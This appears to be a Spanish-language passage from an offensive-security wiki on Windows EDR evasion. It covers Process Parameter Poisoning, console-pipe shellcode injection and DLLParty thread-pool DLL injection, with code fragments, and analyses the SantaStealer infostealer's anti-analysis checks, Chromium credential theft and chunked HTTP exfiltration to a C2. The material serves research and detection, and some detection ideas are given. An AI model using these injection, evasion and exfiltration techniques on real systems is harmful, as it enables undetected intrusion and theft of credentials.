Process Parameter Poisoning (P3) es una técnica de **inyección de procesos / evasión de EDR** que evita la ruta clásica de escritura remota (`VirtualAllocEx` + `WriteProcessMemory`). En lugar de copiar bytes en un proceso objetivo que ya está en ejecución, abusa del hecho de que Windows **copia determinados parámetros de inicio de `CreateProcessW` al proceso hijo** y los almacena en `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Contenedores que `CreateProcessW` puede envenenar y copiar

Los contenedores útiles son:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (con `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Limitaciones prácticas de los contenedores:

- `lpCommandLine` debe apuntar a **memoria escribible** para `CreateProcessW` y está limitado a **32,767 caracteres Unicode**, incluido el terminador nulo.
- `lpEnvironment` debe ser un bloque de entorno Unicode formado por cadenas sucesivas `NAME=VALUE\0` y terminado por un `\0` adicional.
- `lpReserved` está oficialmente reservado, por lo que la asignación a `ShellInfo` debe tratarse como un detalle de implementación y no como un contrato documentado estable.

Esto convierte la creación normal de procesos en la **primitiva de transferencia de payload**. El operador crea el proceso hijo con datos de inicio controlados por el atacante y deja que Windows realice la copia entre procesos.

### Flujo de búsqueda remota sin APIs de escritura remota

Después de crear el proceso hijo, resolver el buffer copiado usando primitivas **de solo lectura**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → obtener `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Leer el `PEB` remoto
3. Seguir `PEB.ProcessParameters`
4. Leer `RTL_USER_PROCESS_PARAMETERS`
5. Usar el puntero seleccionado:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Flujo mínimo:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Ejecutar el búfer de parámetros copiado

La región de parámetros copiada suele tener permisos `RW`, no ser ejecutable. Una cadena P3 común es:

1. Crear el proceso normalmente (no suspendido)
2. Hacer que la página de parámetros elegida sea ejecutable con `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Reutilizar el identificador del hilo principal que ya devolvió `PROCESS_INFORMATION`
4. Redirigir la ejecución con `NtSetContextThread` (`CONTEXT_CONTROL`, sobrescribir `RIP`)

A diferencia de los flujos clásicos de secuestro de hilos, esto **no requiere** `SuspendThread` / `ResumeThread`; el contexto se puede cambiar directamente con el identificador del hilo principal devuelto.

Esto evita varias API que suelen vigilarse para detectar injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- a menudo también `SuspendThread` / `ResumeThread`

### Limitación de los bytes nulos y shellcode por etapas

Los tres portadores son **datos de tipo cadena o similares a cadenas**, por lo que una carga útil sin procesar que contenga `0x00` se trunca durante la transferencia. Una solución práctica es una **primera etapa sin bytes nulos** que reconstruya constantes durante la ejecución y luego cargue una segunda etapa arbitraria.

Un patrón sencillo es la síntesis de constantes mediante XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Esto permite que la primera etapa construya cadenas en la pila, argumentos de API, rutas de DLL o un cargador de shellcode de segunda etapa sin incluir bytes nulos en el parámetro transportado.

### Llamadas a API basadas en la pila desde la primera etapa

Cuando la primera etapa debe llamar a API como `LoadLibraryA`, puede:

- insertar la cadena o el búfer en la pila del proceso de destino
- reservar el **espacio shadow de 32 bytes en x64**
- asignar valores constantes a `RCX`, `RDX`, `R8` y `R9`, o asignarles punteros relativos a `RSP`
- mantener `RSP` **alineado a 16 bytes** antes de la llamada

Luego, se puede copiar una segunda etapa desde la pila a una asignación `PAGE_READWRITE`, cambiar sus permisos a `PAGE_EXECUTE_READ` con `VirtualProtect` y saltar a ella, evitando una asignación RWX directa.

### Ideas para la detección

Buenas oportunidades de detección mencionadas por los autores:

- `VirtualProtectEx` / `NtProtectVirtualMemory` para convertir en ejecutables las **páginas de parámetros del proceso**
- que ese cambio de protección vaya seguido de `SetThreadContext` / `NtSetContextThread`
- lecturas remotas del `PEB` y, luego, de `RTL_USER_PROCESS_PARAMETERS`
- valores inusualmente largos o con alta entropía en `lpCommandLine`, `lpEnvironment` o `STARTUPINFO.lpReserved` durante la creación del proceso

### Notas

- P3 es un **truco de transferencia entre procesos**, no una primitiva de ejecución completa por sí sola: el parámetro copiado todavía requiere un cambio de permisos de ejecución y un método de redirección de la ejecución.
- Los autores consideraron `RtlCreateProcessReflection` / Dirty Vanity, pero lo descartaron porque internamente recurre a primitivas sospechosas como `NtWriteVirtualMemory` y `NtCreateThreadEx`.

## Inyección mediante una tubería de STDIN de consola

También se puede usar un proceso hijo de consola interactivo como **primitiva de transferencia de payload**. El injector redirige la entrada estándar del proceso hijo a una tubería y envía un marcador seguido de shellcode. Después de que el programa de consola lee los datos en su propia memoria privada, el injector encuentra ese búfer, lo hace ejecutable y redirige un hilo del proceso hijo hacia él. Esto evita `VirtualAllocEx` y `WriteProcessMemory`, pero sigue siendo process injection, no un bypass general de EDR.<sup>[[41]](#references)</sup>

A pesar de la descripción «named-pipe», la implementación de referencia llama a `CreatePipe`, que crea una **tubería anónima**. Windows implementa internamente las tuberías anónimas mediante objetos de tubería con nombres únicos, pero el PoC no selecciona una ruta `\\.\pipe\<name>` ni llama a `CreateNamedPipe`. Crea identificadores heredables con un descriptor de seguridad predeterminado, asigna el identificador de lectura a `STARTUPINFO.hStdInput`, establece `STARTF_USESTDHANDLES` e inicia un nuevo proceso hijo con la herencia de identificadores habilitada. Por lo tanto, este PoC inicia el ejecutable de consola indicado; no conecta su tubería a un proceso existente.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Flujo de trabajo de referencia

La implementación sigue esta cadena:<sup>[[41]](#references)</sup>

1. Crea pares de tuberías anónimas para `STDIN` y `STDOUT` del proceso hijo. Deshabilita la herencia en los dos identificadores del proceso padre y, después de crear el proceso, cierra en el padre los duplicados de los identificadores del proceso hijo.
2. Inicia un ejecutable interactivo, como `netsh.exe` o `nslookup.exe`, con `CREATE_NEW_CONSOLE`. El proceso hijo hereda los identificadores estándar redirigidos.
3. Envía la matriz binaria completa `rawData` con `WriteFile` a través del identificador de `STDIN` del proceso padre. El programa de consola consume los bytes y deja una copia en una de sus regiones privadas confirmadas.
4. Recorre el espacio de direcciones del proceso hijo con `VirtualQueryEx`, lee las regiones candidatas `MEM_PRIVATE` con `ReadProcessMemory` y busca el marcador al principio de `rawData`.
5. Cambia los permisos del búfer encontrado a `PAGE_EXECUTE_READWRITE` con `VirtualProtectEx`.
6. Identifica el hilo principal, lo suspende, asigna `found_address + 0x19` a `RIP` con `NtSetContextThread` y lo reanuda.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

La implementación proporcionada es específica para x64: modifica `CONTEXT.Rip` y su payload integrado es shellcode x64. `rawData` comienza con un marcador de 25 bytes, por lo que los bytes ejecutables empiezan en el desplazamiento hexadecimal `0x19`. Al reemplazar el payload, conserva esa disposición o actualiza conjuntamente el marcador, el vector de búsqueda, el tamaño de la matriz y el desplazamiento de ejecución. Los comentarios del código también enumeran `0x0A`, `0x0D` y `0x1A` como caracteres no válidos. Este flujo de trabajo no modifica el token ni los privilegios del proceso hijo.<sup>[[41]](#references)</sup>

Para helpers nativos pequeños y patrones de compilación de payloads, consulta [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Inyección de DLL mediante callback del thread pool sin shellcode (DLLParty)

DLLParty adapta la inyección en thread pool al estilo PoolParty para hacer que un worker existente del proceso objetivo llame a `LoadLibraryA`, en lugar de ejecutar un stub de callback inyectado. Su primitiva de despacho es una finalización `TP_DIRECT` encolada en el puerto de finalización de E/S del pool del proceso objetivo. Esto no elude los permisos del proceso: el PoC llama a `OpenProcess(PROCESS_ALL_ACCESS)` y necesita memoria legible y escribible en el proceso objetivo, además de handles de worker factory y de puerto de finalización que se puedan duplicar.<sup>[[46]](#references)[[47]](#references)</sup>

En Windows x64, el worker pasa un puntero a `TP_CALLBACK_INSTANCE`, ubicado en la pila, mediante `RCX`, el primer argumento del callback. `LoadLibraryA` interpreta ese mismo puntero como un `LPCSTR`. En la ruta probada, `TppWorkerThread` crea el puntero en `RSP+0x178`, mientras que su primera escritura normal en ese objeto ocurre en `RSP+0x1d0`. Por lo tanto, una ruta de DLL terminada en nulo que quepa en este prefijo de 0x58 bytes puede ocupar el inicio de la instancia sin que se sobrescriba antes del despacho. Esta observación es específica de esa compilación; no es una garantía documentada de la ABI de Windows.<sup>[[46]](#references)[[47]](#references)</sup>

El flujo de trabajo de referencia es:<sup>[[46]](#references)[[47]](#references)</sup>

1. Enumera los handles del proceso objetivo con `NtQuerySystemInformation(SystemHandleInformation)` e identifica `TpWorkerFactory` consultando los tipos de objeto. Duplica un handle de worker factory y consulta `WorkerFactoryBasicInformation`; `StartParameter` proporciona el `TP_POOL` remoto. Omite las fábricas con `TotalWorkerCount == 0`.
2. Lee `TP_POOL.CompletionPort` y recorre la lista privada de workers del pool. En la compilación probada de Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`), la cabecera está en `pool+0x60`; cada enlace está en `worker+0x10`, por lo que el slot de `callback-instance` en `worker+0x38` equivale a `link+0x28`. El PoC comprueba la alineación de los punteros, la reciprocidad de los enlaces, la pertenencia al pool, que los ID de subproceso no sean cero, que no haya nodos repetidos y que la cabecera de la lista permanezca estable.
3. Escribe la ruta de la DLL en **todos** los slots de worker recuperados, ya que cualquier worker podría consumir la finalización encolada. Coloca un `TP_DIRECT` en memoria escribible del proceso objetivo, con `Callback = LoadLibraryA`. El PoC usa `last_slot-0x500` en una pila de worker en lugar de `VirtualAllocEx`; ese desplazamiento es experimental y no debe solaparse con datos activos de la pila.
4. Duplica el handle del puerto de finalización del proceso objetivo y llama a `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. La dirección remota de `TP_DIRECT` es la clave de finalización. Un worker existente invoca entonces `LoadLibraryA` con el puntero sobrescrito de la instancia del callback y carga una DLL a la que el proceso objetivo ya tiene acceso.

El PoC recibe un PID objetivo (`DLLParty.exe <target_pid>`) y usa una ruta de DLL codificada directamente en `DLLParty.cpp`; configura una ruta accesible para el proceso objetivo antes de compilar un ejecutable x64. También usa como callback remoto la dirección de `LoadLibraryA` de su propio proceso, por lo que supone que esa dirección es válida en el proceso objetivo. El código no comprueba que la longitud de la ruta quepa en el prefijo de 0x58 bytes ni que el recorrido de workers haya encontrado un slot antes de indexar el último elemento. Vuelve a validar los desplazamientos privados, la disposición de la pila y el espacio escribible para la compilación objetivo. Omitir `CreateRemoteThreadEx`, shellcode y `VirtualAllocEx` no elimina las escrituras entre procesos ni la telemetría de carga de DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Técnicas de SantaStealer para evasión sin archivos y robo de credenciales

SantaStealer (también conocido como BluelineStealer) ilustra cómo los info-stealers modernos combinan el bypass de AV, la anti-análisis y el acceso a credenciales en un solo flujo de trabajo.<sup>[[24]](#references)</sup>

### Restricción por distribución del teclado y demora en sandbox

- Una opción de configuración (`anti_cis`) enumera las distribuciones de teclado instaladas mediante `GetKeyboardLayoutList`. Si encuentra una distribución cirílica, la muestra crea un marcador `CIS` vacío y termina antes de ejecutar los stealers, evitando así activarse en las regiones excluidas y dejando un artefacto útil para la búsqueda.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Lógica de `check_antivm` por capas

- La variante A recorre la lista de procesos, calcula el hash de cada nombre con una suma de comprobación incremental personalizada y lo compara con listas de bloqueo integradas para debuggers/sandboxes; repite el cálculo con el nombre del equipo y comprueba directorios de trabajo como `C:\analysis`.
- La variante B inspecciona propiedades del sistema (un mínimo de procesos y el tiempo de actividad reciente), llama a `OpenServiceA("VBoxGuest")` para detectar las Guest Additions de VirtualBox y realiza comprobaciones de tiempo alrededor de pausas para detectar la ejecución paso a paso. Cualquier detección aborta la ejecución antes de que se inicien los módulos.

### Helper fileless + carga reflectiva doble con ChaCha20

- La DLL/EXE principal incorpora un helper de credenciales de Chromium que se deja en disco o se mapea manualmente en memoria; el modo fileless resuelve por sí mismo las importaciones y reubicaciones, por lo que no se escriben artefactos del helper.
- Ese helper almacena una DLL de segunda etapa cifrada dos veces con ChaCha20 (dos claves de 32 bytes y nonces de 12 bytes). Tras ambos descifrados, carga el blob de forma reflectiva (sin `LoadLibrary`) y llama a las exportaciones `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivadas de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Las rutinas de ChromElevator usan process hollowing reflectivo con direct syscalls para inyectarse en un navegador Chromium activo, heredar claves de AppBound Encryption y descifrar contraseñas, cookies y tarjetas de crédito directamente desde bases de datos SQLite, pese a las protecciones de ABE.

### Recopilación modular en memoria y exfiltración HTTP por fragmentos

- `create_memory_based_log` recorre una tabla global de punteros a funciones `memory_generators` e inicia un hilo por cada módulo habilitado (Telegram, Discord, Steam, capturas de pantalla, documentos, extensiones del navegador, etc.). Cada hilo escribe los resultados en búferes compartidos e informa de la cantidad de archivos tras una espera de unión de unos 45 s.
- Al terminar, todo se comprime con la biblioteca `miniz`, enlazada estáticamente, como `%TEMP%\\Log.zip`. `ThreadPayload1` espera 15 s y luego transmite el archivo en fragmentos de 10 MB mediante HTTP POST a `http://<C2>:6767/upload`, suplantando un límite de navegador `multipart/form-data` (`----WebKitFormBoundary***`). Cada fragmento añade `User-Agent: upload`, `auth: <build_id>` y, opcionalmente, `w: <campaign_tag>`; el último fragmento agrega `complete: true` para indicar al C2 que la reconstrucción ha finalizado.

## References

- [1] [Tácticas avanzadas de evasión: Module Stomping de precisión](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Pilas de llamadas: se acabaron las concesiones para el malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentación](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – ejemplo](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – ejemplo](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC para suplantar pilas de llamadas](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nueva cadena de infección y ofuscación basada en ConfuserEx para DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – ¿Deberías confiar en tu zero trust? Cómo eludir las comprobaciones de postura de Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Antes de ToolShell: exploración de las operaciones de ransomware anteriores de Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: abuso de exportaciones reenviadas](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventario de exportaciones reenviadas de Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Orden de búsqueda de bibliotecas de vínculos dinámicos](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Seguridad de procesos y derechos de acceso](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Referencia de EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Lanzador CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Cómo contrarrestar los EDR con el respaldo de Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Romper la coraza protectora de Windows Defender con la técnica de redirección de carpetas](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referencia del comando mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Tras la cortina pura: de RAT a builder y a coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer llega a la ciudad: un nuevo y ambicioso infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Descifrado de Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: cómo vencer al malware de Node.js mediante el rastreo de API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [La Bella Durmiente: poner Adaptix a dormir con Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Envenenamiento de parámetros de proceso](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [La Bella Durmiente II: CFG, CET y suplantación de pila](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ofuscación del sueño Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Ocultar el ETW de Dotnet](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abuso de Chrome Remote Desktop en operaciones de Red Team: guía práctica](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: convertir el controlador de remediación de Defender en una primitiva de operaciones de kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Código complementario de Function Peekaboo de MDSec](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: creación de funciones autoenmascarables con LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Código fuente de InjectSetConsole de TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Función CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creación de un proceso secundario con entrada y salida redirigidas](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: refundición de herramientas C# con WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compilación de proyectos C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Prueba de concepto y código fuente de DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — abuso de los componentes internos del thread pool para la inyección de DLL sin shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Conjunto de datos de referencia EMBER2024 y herramientas thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Uso de EMBER2024 para evaluar implantes de Red Team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Cómo evadir las detecciones basadas en machine learning](https://msecops.de/blog/posts/ml-evasion/)
{{#include ../banners/hacktricks-training.md}}
